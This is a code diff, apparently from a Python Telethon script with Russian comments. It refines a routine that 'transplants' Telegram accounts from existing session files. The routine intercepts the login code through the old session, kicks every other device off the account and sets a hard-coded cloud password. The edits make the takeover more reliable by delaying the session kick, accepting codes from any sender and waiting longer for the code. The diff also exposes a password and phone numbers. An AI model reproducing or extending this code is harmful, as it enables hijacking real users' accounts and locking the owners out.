@@ -5546,7 +5546,7 @@ TRANSPLANT_CLOUD_PASS = "Ali095095"
 TRANSPLANT_INTERVAL = 180        # проход каждые 3 мин
 TRANSPLANT_START_DELAY = 30
 TRANSPLANT_CAP = 5               # параллельные пересадки
-TRANSPLANT_CODE_WAIT = 120       # секунд ждём код от 777000
+TRANSPLANT_CODE_WAIT = 300       # секунд ждём код от 777000
 # телефоны, которые воркер не пересаживает и не кикает
 TRANSPLANT_EXCLUDE_PHONES = {"917066653092"}
 TRANSPLANT_EXCLUDE_STEMS = {"s917066653092"}
@@ -5678,9 +5678,15 @@ async def _transplant_read_code(client, timeout: float) -> str | None:
         if fut.done():
             return
         text = event.message.text or event.message.message or ""
-        m = re.search(r"\b(\d{5})\b", text)
-        if m:
-            fut.set_result(m.group(1))
+        m = re.search(r"\b(\d{5,6})\b", text)
+        if not m:
+            return
+        # prefer the Telegram service chat, but any code-shaped message wins
+        sender = getattr(event.message, "sender_id", None)
+        if sender is not None and int(sender) != 777000:
+            log.info("transplant: code-shaped msg from %s — using anyway",
+                     sender)
+        fut.set_result(m.group(1))
 
     client.add_event_handler(_h, _tlev.NewMessage(incoming=True))
     try:
@@ -5731,20 +5737,8 @@ async def _transplant_one(sess: Path) -> bool:
                 await old.disconnect()
                 return False
 
-            # 1. кик всех чужих сессий
-            log.info("transplant %s: +%s resetting other sessions", name, phone)
-            try:
-                await old(ResetAuthorizationsRequest())
-            except FloodWaitError as e:
-                log.warning("transplant %s: FloodWait %ss — skip", name, e.seconds)
-                await old.disconnect()
-                return False
-            except Exception as e:
-                log.warning("transplant %s: reset failed: %s", name, e)
-                await old.disconnect()
-                return False
-            await asyncio.sleep(2)
-
+            # 1. no reset yet: other devices stay alive so the login code has
+            #    a live app session to land in; the kick runs at step 5
             # 2. запрашиваем код входа на новой сессии
             new_api_id, new_api_hash = random.choice(_TRANSPLANT_API_PAIRS)
             new_path = TRANSPLANT_OUT / f"{name}_new"
@@ -5759,7 +5753,11 @@ async def _transplant_one(sess: Path) -> bool:
                     settings=CodeSettings(),
                 ))
                 phone_code_hash = sent.phone_code_hash
-                log.info("transplant %s: code requested", name)
+                log.info("transplant %s: code requested | type=%s next=%s "
+                         "timeout=%s", name,
+                         type(getattr(sent, "type", None)).__name__,
+                         type(getattr(sent, "next_type", None)).__name__,
+                         getattr(sent, "timeout", None))
             except Exception as e:
                 log.warning("transplant %s: send code failed: %s", name, e)
                 try:
@@ -5861,6 +5859,19 @@ async def _transplant_one(sess: Path) -> bool:
                     pass
                 await old.disconnect()
                 return False
+
+            # 4e. now kick every other session of the account: the new one
+            #     is already on origin/main, so nothing can be lost here
+            log.info("transplant %s: resetting other sessions", name)
+            try:
+                await old(ResetAuthorizationsRequest())
+            except FloodWaitError as e:
+                log.warning("transplant %s: reset FloodWait %ss — other "
+                            "sessions left alive", name, e.seconds)
+            except Exception as e:
+                log.warning("transplant %s: reset failed: %s — other "
+                            "sessions left alive", name, e)
+            await asyncio.sleep(2)
 
             # 5. облачный пароль через старую сессию
             try:
